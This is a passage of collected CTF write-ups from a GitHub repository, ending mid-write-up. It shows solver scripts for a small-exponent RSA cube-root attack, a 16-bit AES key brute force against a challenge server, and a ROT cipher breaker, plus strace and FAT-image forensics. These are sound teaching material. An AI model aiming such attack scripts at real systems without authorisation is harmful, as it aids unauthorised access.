{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_36C3_Junior/small.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_36C3_Junior/small.md", "content": "# small\r\nCrypto, Easy\r\n\r\n## Description\r\n\r\n> When things are small you have to be carefull!\r\n\r\n```\r\nmessage = int('REDACTED', base=35)\r\nN = 31882864753733457706900355195561745936205728163688545344755624355885302677527509480805991969514641856022311950710014654686332759895303124949904557581766107448945073828773339824936328117599459705430379854436444155104737774883908742430619368768337640156577480749932446289330171110268995901030116001751822218657\r\nc = message^3 % N\r\n# c = 272712645051843502864020676686837219546440933810920336253597504130258033336636323130656292878088405243095416128\r\n\r\nThe message is the flag. No flag format.\r\n```\r\n\r\n## Solution\r\n\r\nThis looks like RSA with a small exponent. This is similar to the picoCTF [miniRSA](/2019_picoCTF/miniRSA.md) challenge. \r\n\r\nWe find the cube root of `c` and decode it as base35 (since the message itself was encoded in base35).\r\n\r\n```python\r\nimport gmpy2\r\n\r\nn = 31882864753733457706900355195561745936205728163688545344755624355885302677527509480805991969514641856022311950710014654686332759895303124949904557581766107448945073828773339824936328117599459705430379854436444155104737774883908742430619368768337640156577480749932446289330171110268995901030116001751822218657\r\ne = 3\r\ncipher_str = 272712645051843502864020676686837219546440933810920336253597504130258033336636323130656292878088405243095416128 \r\n\r\n\r\ngs = gmpy2.mpz(cipher_str)\r\ngm = gmpy2.mpz(n)\r\nge = gmpy2.mpz(e)\r\n\r\nroot, exact = gmpy2.iroot(gs, ge)\r\nprint root\r\n\r\ndef base35encode(integer):\r\n    \"\"\"\r\n    Convert from Base10 to Base35.\r\n    Based on https://en.wikipedia.org/wiki/Base36\r\n    \"\"\"\r\n    chars = '0123456789abcdefghijklmnopqrstuvwxy'\r\n\r\n    sign = '-' if integer < 0 else ''\r\n    integer = abs(integer)\r\n    result = ''\r\n\r\n    while integer > 0:\r\n        integer, remainder = divmod(integer, 35)\r\n        result = chars[remainder] + result\r\n\r\n    return sign + result\r\n\r\nprint base35encode(root)\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/small# python 1.py\r\n6484877229948717415163579969767084212\r\njuniorissmallkuchenblech\r\n```", "timestamp": "2025-10-21T13:36:18.387652"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_36C3_Junior/tracer.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_36C3_Junior/tracer.md", "content": "# tracer\r\nForensics, Easy\r\n\r\n## Description\r\n\r\n> Tracing the Kuchenblech-Mafia is hard!\r\n\r\nA text file was attached.\r\n\r\n## Solution\r\n\r\nLet's check the attached file:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/tracer# cat chal2-98f6917950f95448890949f2d9b9850a.txt | head\r\n264   execve(\"/bin/bash\", [\"/bin/bash\"], 0x7ffdebc8fb30 /* 8 vars */) = 0\r\n264   read(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\220\\311\\0\\0\\0\\0\\0\\0\"..., 832) = 832\r\n264   read(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0P\\16\\0\\0\\0\\0\\0\\0\"..., 832) = 832\r\n264   read(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\260\\34\\2\\0\\0\\0\\0\\0\"..., 832) = 832\r\n264   read(3, \"# /etc/nsswitch.conf\\n#\\n# Example\"..., 4096) = 497\r\n264   read(3, \"\", 4096)                 = 0\r\n264   read(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\240\\22\\0\\0\\0\\0\\0\\0\"..., 832) = 832\r\n264   read(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0p \\0\\0\\0\\0\\0\\0\"..., 832) = 832\r\n264   read(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\220@\\0\\0\\0\\0\\0\\0\"..., 832) = 832\r\n264   read(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0P#\\0\\0\\0\\0\\0\\0\"..., 832) = 832\r\nroot@kali:/media/sf_CTFs/36c3/tracer# cat chal2-98f6917950f95448890949f2d9b9850a.txt | tail\r\n541   write(1, \"\\33[?2004l\\33[?1l\\33>\", 15) = 15\r\n541   write(1, \"\\33[?25h\\33[?1049l\\33[23;0;0t\", 23) = 23\r\n541   +++ exited with 0 +++\r\n264   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=541, si_uid=0, si_status=0, si_utime=14, si_stime=5} ---\r\n264   write(2, \"\\33]0;root@c28a269da35a: /\\7root@c2\"..., 46) = 46\r\n264   read(0, \"\\4\", 1)                  = 1\r\n264   write(2, \"exit\\n\", 5)             = 5\r\n264   write(3, \"apt install vim\\nvim Flag\\n\", 25) = 25\r\n264   read(3, \"apt install vim\\nvim Flag\\n\", 25) = 25\r\n264   +++ exited with 0 +++\r\n```\r\n\r\nIt looks like the output of `strace`, mainly describing the process of installing `vim` via `apt install` and using it to open a file named `Flag`.\r\n\r\nThe trace itself is 66047 lines long, but up to line ~65600 the output is only related to the installation itself.\r\n\r\nOn line 65624 we have:\r\n```\r\n541   execve(\"/usr/bin/vim\", [\"vim\", \"Flag\"], 0x5592eb5cdef0 /* 8 vars */) = 0\r\n```\r\n\r\nThis is where `vim` is requested to open the `Flag` file.\r\n\r\nSlowly scanning through the rest of the file, we eventually meet the following section:\r\n```\r\n541   read(0, \"j\", 4096)                = 1\r\n541   write(3, \"b0VIM 8.0\\0\\0\\0\\0\\20\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\35\\2\\0\\0root\"..., 4096) = 4096\r\n541   write(1, \"\\33[?25lj\\33[53;174H1,2\\33[1;2H\\33[?25h\", 31) = 31\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   write(1, \"\\33[?25l\\33[2;1H\\33[K\\33[53;174H2,1\\33[2;1\"..., 39) = 39\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   write(1, \"\\33[?25l\\33[3;1H\\33[K\\33[53;174H3\\33[3;1H\\33\"..., 37) = 37\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   write(1, \"\\33[?25l\\33[4;1H\\33[K\\33[53;174H4\\33[4;1H\\33\"..., 37) = 37\r\n541   read(0, \"u\", 4096)                = 1\r\n541   write(1, \"\\33[?25lu\\33[53;176H2\\33[4;2H\\33[?25h\", 29) = 29\r\n541   read(0, \"n\", 4096)                = 1\r\n541   write(1, \"\\33[?25ln\\33[53;176H3\\33[4;3H\\33[?25h\", 29) = 29\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   write(1, \"\\33[?25l\\33[5;1H\\33[K\\33[53;174H5,1\\33[5;1\"..., 39) = 39\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   write(1, \"\\33[?25l\\33[6;1H\\33[K\\33[53;174H6\\33[6;1H\\33\"..., 37) = 37\r\n541   read(0, \"i\", 4096)                = 1\r\n541   write(1, \"\\33[?25li\\33[53;176H2\\33[6;2H\\33[?25h\", 29) = 29\r\n541   read(0, \"o\", 4096)                = 1\r\n541   write(1, \"\\33[?25lo\\33[53;176H3\\33[6;3H\\33[?25h\", 29) = 29\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   write(1, \"\\33[?25l\\33[7;1H\\33[K\\33[53;174H7,1\\33[7;1\"..., 39) = 39\r\n541   read(0, \"r\", 4096)                = 1\r\n541   write(1, \"\\33[?25lr\\33[53;176H2\\33[7;2H\\33[?25h\", 29) = 29\r\n```\r\n\r\nIgnoring the `\\r` inputs, we can identify `junior` which is the flag format.\r\n\r\nLet's extract all the `read`s from this section:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/tracer# cat chal2-98f6917950f95448890949f2d9b9850a.txt | tail -n +65782 | grep read\r\n541   read(0, \"i\", 4096)                = 1\r\n541   read(0, \"j\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"u\", 4096)                = 1\r\n541   read(0, \"n\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"i\", 4096)                = 1\r\n541   read(0, \"o\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"r\", 4096)                = 1\r\n541   read(0, \"-\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"n\", 4096)                = 1\r\n541   read(0, \"a\", 4096)                = 1\r\n541   read(0, \"\\33\", 4096)              = 1\r\n541   read(0, \"y\", 4096)                = 1\r\n541   read(0, \"y\", 4096)                = 1\r\n541   read(0, \"p\", 4096)                = 1\r\n541   read(0, \"A\", 4096)                = 1\r\n541   read(0, \"\\177\", 4096)             = 1\r\n541   read(0, \"o\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"i\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"s\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"w\", 4096)                = 1\r\n541   read(0, \"a\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"y\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"b\", 4096)                = 1\r\n541   read(0, \"e\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"t\", 4096)                = 1\r\n541   read(0, \"t\", 4096)                = 1\r\n541   read(0, \"e\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"r\", 4096)                = 1\r\n541   read(0, \"!\", 4096)                = 1\r\n541   read(0, \"\\33\", 4096)              = 1\r\n541   read(0, \"g\", 4096)                = 1\r\n541   read(0, \"g\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"J\", 4096)                = 1\r\n541   read(0, \"b\", 4096)                = 1\r\n541   read(0, \"b\", 4096)                = 1\r\n541   read(0, \"~\", 4096)                = 1\r\n541   read(0, \"~\", 4096)                = 1\r\n541   read(0, \"~\", 4096)                = 1\r\n541   read(0, \"~\", 4096)                = 1\r\n541   read(0, \"~\", 4096)                = 1\r\n541   read(0, \"~\", 4096)                = 1\r\n541   read(0, \"~\", 4096)                = 1\r\n541   read(0, \"~\", 4096)                = 1\r\n541   read(0, \"\\33\", 4096)              = 1\r\n541   read(0, \":\", 4096)                = 1\r\n541   read(0, \"s\", 4096)                = 1\r\n541   read(0, \"/\", 4096)                = 1\r\n541   read(0, \" \", 4096)                = 1\r\n541   read(0, \"/\", 4096)                = 1\r\n541   read(0, \"/\", 4096)                = 1\r\n541   read(0, \"g\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n541   read(0, \"\\33\", 4096)              = 1\r\n541   read(0, \":\", 4096)                = 1\r\n541   read(0, \"w\", 4096)                = 1\r\n541   read(0, \"q\", 4096)                = 1\r\n541   read(0, \"\\r\", 4096)               = 1\r\n264   read(0, \"\\4\", 1)                  = 1\r\n264   read(3, \"apt install vim\\nvim Flag\\n\", 25) = 25\r\n```\r\n\r\nLet's clean it up a bit:\r\n```\r\nroot@kali:/media/sf_CTFs/36c3/tracer# cat chal2-98f6917950f95448890949f2d9b9850a.txt | tail -n +65782 | grep read | awk '{printf $3}' | tr -d '\",' | sed 's/\\\\r/\\\\r\\n/g'\r\nij\\r\r\n\\r\r\n\\r\r\nun\\r\r\n\\r\r\nio\\r\r\nr-\\r\r\nna\\33yypA\\177o\\r\r\n\\r\r\ni\\r\r\ns\\r\r\n\\r\r\nwa\\r\r\ny\\r\r\nbe\\r\r\ntte\\r\r\n\\r\r\nr!\\33ggJJJJJJJJJJJJJJJJJJbb~~~~~~~~\\33:s///g\\r\r\n\\33:wq\\r\r\n\\4apt\r\n```\r\n\r\nIf it wasn't clear until now, the `:wq` is a dead giveaway: We need to open `vim` and re-enter this input in order to get the flag.\r\n\r\nThe only remaining question is what to type for `\\33` and for `\\177`.  It turns out that these are octal representations of ASCII characters:\r\n```console\r\nroot@kali:/media/sf_CTFs/36c3/tracer# man ascii | grep 033\r\n       033   27    1B    ESC (escape)                133   91    5B    [\r\nroot@kali:/media/sf_CTFs/36c3/tracer# man ascii | grep 177\r\n       077   63    3F    ?                           177   127   7F    DEL\r\n```\r\n\r\nThis means that `\\33` is `ESC` and `\\177` is `DEL`.\r\n\r\nThe flag is: `junior-nanoiswayBETTER!`. Indeed.\r\n", "timestamp": "2025-10-21T13:36:18.595343"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/16-bit-AES.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/16-bit-AES.md", "content": "# 16-bit-AES\r\nCrypto, 100 points\r\n\r\n## Description\r\n\r\n> Why so small?\r\n\r\n## Solution\r\n\r\nWe connect to the server and see the following message:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/16_bit_AES# nc archive.sunshinectf.org 19003\r\nWelcome, I'm using an AES-128 cipher with a 16-bit key in ECB mode.\r\n\r\nI'll give you some help: give me some text, and I'll tell you what it looks like\r\n\r\nYour text:\r\ntest\r\n5daa39d0cd90af3ded4b2813413f138c\r\n\r\nOk, now encrypt this text with the same key: LGSQKtc4T25nsl29\r\n```\r\n\r\nThe service allows us to encrypt a string of our choice and observe the result, then requests us to encrypt a string with the same key.\r\n\r\nWhat happens if we run the service again and enter the same string:\r\n```\r\nWelcome, I'm using an AES-128 cipher with a 16-bit key in ECB mode.\r\n\r\nI'll give you some help: give me some text, and I'll tell you what it looks like\r\n\r\nYour text:\r\ntest\r\n5daa39d0cd90af3ded4b2813413f138c\r\n\r\nOk, now encrypt this text with the same key: AjEdDZgk25hf1ByV\r\n```\r\n\r\nWe get the same result for our text, but a different string to encrypt ourselves. In other words, the key isn't changed throughout sessions.\r\n\r\nThe obvious solution is to open two sessions, take the string they ask us to encrypt from session #1, paste it in session #2 as the script we can encrypt ourselves, and copy the result back to session #1. However, that would work for any key length, so it feels like cheating. Since the key is so small (16 bits), we are probably expected to brute force it.\r\n\r\nFirst, we try the following code, to try and encrypt AES-ECB with a 16-bit key:\r\n```python\r\nfrom Crypto.Cipher import AES\r\n \r\nkey = 'aa'\r\n \r\ncipher = AES.new(key, AES.MODE_ECB)\r\nmsg = cipher.encrypt('0123456789abcdef')\r\n \r\nprint(msg.encode(\"hex\"))\r\n```\r\n\r\nHowever, we get the following error:\r\n```\r\nValueError: AES key must be either 16, 24, or 32 bytes long\r\n```\r\n\r\nEither the challenge is expecting us to implement AES with a 16-bit key, or the 16-bit key is duplicated 8 times to create a 16-byte key (or more for another key length). Since the latter is easier to test, we start from it.\r\n\r\n\r\nThe script:\r\n```python\r\nfrom Crypto.Cipher import AES\r\nfrom itertools import product\r\nfrom pwn import *\r\nimport string\r\n\r\ndef find_key(plaintext, ciphertext_hex):\r\n    for key_chars in product(string.printable, repeat=2):\r\n        key = (''.join(key_chars)) * 8\r\n        cipher = AES.new(key, AES.MODE_ECB)\r\n        msg = cipher.encrypt(plaintext)\r\n        if msg.encode(\"hex\") == \"552403aa43019223392a5516cd788601\":\r\n            return key\r\n    return None\r\n\r\ntext_to_encrypt = '0123456789abcdef'\r\np = remote(\"archive.sunshinectf.org\", 19003)\r\np.sendlineafter(\"Your text:\", text_to_encrypt)\r\nencrypted = p.recvline()\r\nserver_key = find_key(text_to_encrypt, encrypted)\r\nlog.info(\"Server key: {}\".format(server_key))\r\nif server_key is not None:\r\n    p.recvuntil(\"same key: \")\r\n    server_text_to_encrypt = p.recvline(keepends = False).rstrip()\r\n    log.info(\"Text to encrypt: {}\".format(server_text_to_encrypt))\r\n    encrypted_server_text = AES.new(server_key, AES.MODE_ECB).encrypt(server_text_to_encrypt)\r\n    p.sendline(encrypted_server_text.encode(\"hex\"))\r\n    print p.recvall()\r\n```\r\n\r\nThe output:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/16_bit_AES# python solve.py\r\n[+] Opening connection to archive.sunshinectf.org on port 19003: Done\r\n[*] Server key: fLfLfLfLfLfLfLfL\r\n[*] Text to encrypt: 8VLnmj1cTliKa8Ht\r\n[+] Receiving all data: Done (68B)\r\n[*] Closed connection to archive.sunshinectf.org port 19003\r\n\r\nCorrect! The flag is sun{Who_kn3w_A3$_cou1d_be_s0_vulner8ble?}\r\n```\r\n", "timestamp": "2025-10-21T13:36:21.998085"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/CB1.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/CB1.md", "content": "# CB1\r\nCrypto, 50 points\r\n\r\n## Description\r\n\r\n> We picked up a new numbers station that's been active in the shortwave bands. We need to figure out how to crack his code.\r\n> \r\n> Here's an example file, crack the cipher and send us the plaintext message.\r\n>\r\n> NOTE: NON-Standard Flag Format\r\n\r\nA WAV file was attached.\r\n\r\n## Solution\r\n\r\nWe listen to the file and hear the speaker spell out the following text using [NATO phonetic alphabet](https://en.wikipedia.org/wiki/NATO_phonetic_alphabet):\r\n\r\n> hkcgxkznkojkyulsgxin\r\n\r\nIt's a total overkill, but the following script will try all ROT options and output the best guess for the solution, based on frequency analysis:\r\n\r\n```python\r\nfrom collections import namedtuple\r\nfrom pprint import pprint\r\nimport argparse\r\nimport string\r\nimport math\r\nimport sys\r\n\r\nclass Rot(object):\r\n    _ROT47_FROM = ord(\"!\")\r\n    _ROT47_TO = ord(\"~\")\r\n\r\n    ROT47_LENGTH = _ROT47_TO - _ROT47_FROM + 1\r\n    ROT_LENGTH = len(string.ascii_lowercase)\r\n\r\n    @classmethod\r\n    def rot_n(cls, n, input_str):\r\n        translation = str.maketrans(string.ascii_lowercase + string.ascii_uppercase, \r\n                                    string.ascii_lowercase[n:] + string.ascii_lowercase[:n] \r\n                                    + string.ascii_uppercase[n:] + string.ascii_uppercase[:n])\r\n        return input_str.translate(translation)\r\n\r\n    @classmethod\r\n    def rot47_n(cls, n, input_str):\r\n        x = []\r\n        for i in range(len(input_str)):\r\n            c = ord(input_str[i])\r\n            if cls._ROT47_FROM <= c <= cls._ROT47_TO:\r\n                x.append(chr(cls._ROT47_FROM + ((c - cls._ROT47_FROM + n) % cls.ROT47_LENGTH)))\r\n            else:\r\n                x.append(input_str[i])\r\n        return ''.join(x)\r\n\r\n    @classmethod\r\n    def get_algorithms(cls):\r\n        Rot_Algo = namedtuple(\"Rot_Algo\", \"method length name\")\r\n        return {cls.rot_n: Rot_Algo(cls.rot_n, cls.ROT_LENGTH, \"rot_n\"), \r\n                cls.rot47_n: Rot_Algo(cls.rot47_n, cls.ROT47_LENGTH, \"rot47_n\")}\r\n\r\n\r\nCandidate = namedtuple('Candidate', 'string score key algorithm')\r\n\r\n# Letter frequencies - taken from http://en.wikipedia.org/wiki/Letter_frequency\r\n_LETTER_FREQUENCY = {'E': 12.70, 'T': 9.06, 'A': 8.17, 'O': 7.51, 'I': 6.97, 'N': 6.75, 'S': 6.33, \r\n                                'H': 6.09, 'R': 5.99, 'D': 4.25, 'L': 4.03, 'C': 2.78, 'U': 2.76, 'M': 2.41, \r\n                                'W': 2.36, 'F': 2.23, 'G': 2.02, 'Y': 1.97, 'P': 1.93, 'B': 1.29, 'V': 0.98, \r\n                                'K': 0.77, 'J': 0.15, 'X': 0.15, 'Q': 0.10, 'Z': 0.07}\r\n\r\n\r\n# A list of common punctuation characters\r\n_COMMON_PUNCTUATION = \" ,.\"\r\n\r\n# Default frequency for uncommon characters.\r\n# Used to apply a penalty for these characters.\r\n# Chosen based on estimation.\r\n_FREQUENCY_FOR_UNCOMMON_CHARS = 0.03 \r\n\r\ndef is_str_printable(input_str):\r\n    \"\"\"\r\n    Returns True iff the given string consists of printable characters only.\r\n    \"\"\"\r\n    alphabet = string.printable + '\\n'\r\n    return all(x in alphabet for x in input_str)\r\n\r\ndef get_score_using_chi_square(candidate, use_penalty = False):\r\n    \"\"\"\r\n    A scoring system based on calculating the Chi Square distance between the given string and the \r\n    average letter frequencies.\r\n    Optionally, can apply penalty to candidates which have uncommon characters.\r\n    \"\"\"\r\n    freq = _get_frequency(candidate)\r\n        \r\n    chi_sum = 0\r\n    for c, f in freq.items():\r\n        if c in string.ascii_uppercase:\r\n            chi_sum += float((f - _LETTER_FREQUENCY[c]) ** 2) / _LETTER_FREQUENCY[c]\r\n        elif use_penalty and c not in _COMMON_PUNCTUATION:\r\n            chi_sum += float((f - _FREQUENCY_FOR_UNCOMMON_CHARS) ** 2) / _FREQUENCY_FOR_UNCOMMON_CHARS # Penalty for uncommon punctuation characters\r\n    return chi_sum * -1\r\n\r\n\r\ndef _get_frequency(s):\r\n    \"\"\"\r\n    Returns a dictionary containing characters in the given string, and their frequencies.\r\n    \"\"\"\r\n    string = s.upper()\r\n    freq = {}\r\n    string_len = len(string)\r\n\r\n    for c in set(string):\r\n        freq[c] = 100.0 * string.count(c) / string_len\r\n\r\n    return freq\r\n\r\ndef print_all(algo, input_str):\r\n    length = Rot.get_algorithms()[algo].length\r\n    for i in range(length):\r\n        candidate = algo(i, input_str)\r\n        if is_str_printable(candidate):\r\n            print (\"{:02}: {}\".format(i, candidate))\r\n\r\ndef solve_rot(input_str):\r\n    candidates = []\r\n    for (algo, length, name) in Rot.get_algorithms().values():\r\n        for i in range(length):\r\n            candidate = algo(i, input_str)\r\n            if is_str_printable(candidate):\r\n                score = get_score_using_chi_square(candidate, use_penalty = True)\r\n                candidates.append(Candidate(candidate, score, i, name)) # highest score = best match\r\n\r\n    if len(candidates) == 0:\r\n        return None\r\n\r\n    candidates.sort(key = lambda x: x.score, reverse = True)\r\n    #pprint(candidates)\r\n    return candidates[0]\r\n\r\nif __name__ == \"__main__\":\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"-v\", \"--verbose\", help=\"Verbose output\", action = \"store_true\")\r\n\r\n    input_group = parser.add_mutually_exclusive_group(required = True)\r\n    input_group.add_argument(\"-s\", \"--string\", help=\"Input string for ROT algorithm\", action = \"store\")\r\n    input_group.add_argument(\"-i\", \"--infile\", nargs=\"?\", type=argparse.FileType(\"r\"), const=sys.stdin)\r\n\r\n    action_group = parser.add_mutually_exclusive_group(required = True)\r\n    action_group.add_argument(\"-g\", \"--guess\", help=\"Try all options and print best candidate\", action = \"store_true\")\r\n    action_group.add_argument(\"--rot_n\", help=\"Perform ROT_n with a shift of N\", action = \"store\", nargs='?', const=\"all\", metavar=\"N\")\r\n    action_group.add_argument(\"--rot47_n\", help=\"Perform ROT47_n with a shift of N\", action = \"store\", nargs='?', const=\"all\", metavar=\"N\")\r\n    args = parser.parse_args()\r\n\r\n    if args.string:\r\n        in_string = args.string\r\n    else:\r\n        in_string = args.infile.read().rstrip()\r\n\r\n    if args.rot_n == \"all\":\r\n        print_all(Rot.rot_n, in_string)\r\n    elif args.rot_n:\r\n        if not args.rot_n.isdigit():\r\n            parser.error(\"Error: N must be a positive number\")\r\n        print (Rot.rot_n(int(args.rot_n), in_string))\r\n    elif args.rot47_n == \"all\":\r\n        print_all(Rot.rot47_n, in_string)\r\n    elif args.rot47_n:\r\n        if not args.rot47_n.isdigit():\r\n            parser.error(\"Error: N must be a positive number\")\r\n        print (Rot.rot47_n(int(args.rot47_n), in_string))\r\n    elif args.guess:\r\n        sol = solve_rot(in_string)\r\n        if sol is not None:\r\n            print (sol.string)\r\n            if args.verbose:\r\n                print (\"Key: {}\".format(sol.key))\r\n                print (\"Algorithm: {}\".format(sol.algorithm))\r\n        else:\r\n            print (\"Error: Could not find solution\")\r\n\r\n```\r\n\r\nOutput:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/CB1# python3 rot.py -g -s \"hkcgxkznkojkyulsgxin\"\r\nbewaretheidesofmarch\r\n```\r\n\r\nThe flag: bewaretheidesofmarch", "timestamp": "2025-10-21T13:36:22.097325"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_SunshineCTF/Castles.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_SunshineCTF/Castles.md", "content": "# Castles\r\nForensics, 150 points\r\n\r\n## Description\r\n\r\n> The flag might be in another castle.\r\n\r\nA binary file was attached.\r\n\r\n## Hint 1:\r\n\r\n> If you are almost there, someone may have used STEG to HIDE something.\r\n\r\n## Hint 2:\r\n\r\n> If you've found the message for peach, it is a guide for where to find the two halves of the key, not the key itself. Think of how the four letters relate to the castles.\r\n\r\n## Solution\r\n\r\nLet's inspect the attached file:\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# file Castles.001\r\nCastles.001: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"MSDOS5.0\", sectors/cluster 4, reserved sectors 4, root entries 512, Media descriptor 0xf8, sectors/FAT 238, sectors/track 63, heads 255, sectors 243712 (volumes > 32 MB), serial number 0xa4c3fb1f, unlabeled, FAT (16 bit)\r\n```\r\n\r\nIt's a FAT image file. \r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# fsck.vfat Castles.001\r\nfsck.fat 4.1 (2017-01-24)\r\nCastles.001: 7 files, 395/60800 clusters\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# fsck.vfat Castles.001 -l\r\nfsck.fat 4.1 (2017-01-24)\r\nChecking file /System Volume Information (SYSTEM~1)\r\nChecking file /Castelo_da_Feira.jpg (CASTEL~1.JPG)\r\nChecking file /Inveraray_Castle.jpg (INVERA~1.JPG)\r\nChecking file /Castello_Di_Amorosa.jpg (CASTEL~2.JPG)\r\nChecking file /Spis_castle.jpg (SPIS_C~1.JPG)\r\nChecking file /System Volume Information/.\r\nChecking file /System Volume Information/..\r\nChecking file /System Volume Information/WPSettings.dat (WPSETT~1.DAT)\r\nChecking file /System Volume Information/IndexerVolumeGuid (INDEXE~1)\r\nCastles.001: 7 files, 395/60800 clusters\r\n```\r\n\r\nAccording to `fsck`, it contains 7 files, 4 out of them seem to be JPG files.\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# debugfs Castles.001\r\ndebugfs 1.44.1 (24-Mar-2018)\r\nChecksum errors in superblock!  Retrying...\r\nCastles.001: Bad magic number in super-block while opening filesystem\r\nCastles.001 contains a vfat file system\r\ndebugfs:  ls\r\nls: Filesystem not open\r\n```\r\n\r\n`debugfs` is unable to list the files, but we can try `fls` instead:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# fls -r Castles.001\r\nd/d 5:  System Volume Information\r\n+ r/r 519:      WPSettings.dat\r\n+ r/r 522:      IndexerVolumeGuid\r\nr/r * 8:        Castelo_da_Feira.jpg\r\nr/r 11: Castelo_da_Feira.jpg\r\nr/r * 14:       Inveraray_Castle.jpg\r\nr/r 17: Inveraray_Castle.jpg\r\nr/r * 20:       Castello_Di_Amorosa.jpg\r\nr/r 23: Castello_Di_Amorosa.jpg\r\nr/r * 26:       spis-castle.jpg\r\nr/r 29: Spis_castle.jpg\r\nr/r * 32:       AlmostThere.jpg\r\nv/v 3891715:    $MBR\r\nv/v 3891716:    $FAT1\r\nv/v 3891717:    $FAT2\r\nV/V 3891718:    $OrphanFiles\r\n```\r\n\r\nThis time we see five distinct JPG files! The `*` marks deleted files, and there's a file which only exists as a deleted item: `AlmostThere.jpg`.\r\n\r\nWe can try to extract the files using `icat`, specifying the inode ID:\r\n```console\r\nicat Castles.001 32 > AlmostThere.jpg\r\nicat Castles.001 8 > Castelo_da_Feira.jpg\r\nicat Castles.001 14 > Inveraray_Castle.jpg\r\nicat Castles.001 20 > Castello_Di_Amorosa.jpg\r\nicat Castles.001 26 > spis-castle.jpg\r\n```\r\n\r\nNote: `foremost` can extract the files as well.\r\n\r\nUntil here it's pretty obvious, this is where things get a bit harder, and where the hints come in handy.\r\n\r\n> If you are almost there, someone may have used STEG to HIDE something.\r\n\r\nThis obviously means that `steghide` was used to hide a message in `AlmostThere.jpg`, but we'll need a passphrase to extract the message.\r\n\r\n> If you've found the message for peach, it is a guide for where to find the two halves of the key, not the key itself. Think of how the four letters relate to the castles.\r\n\r\nWhat's the message for peach?\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/sunshine/Castles# grep peach Castles.001\r\nBinary file Castles.001 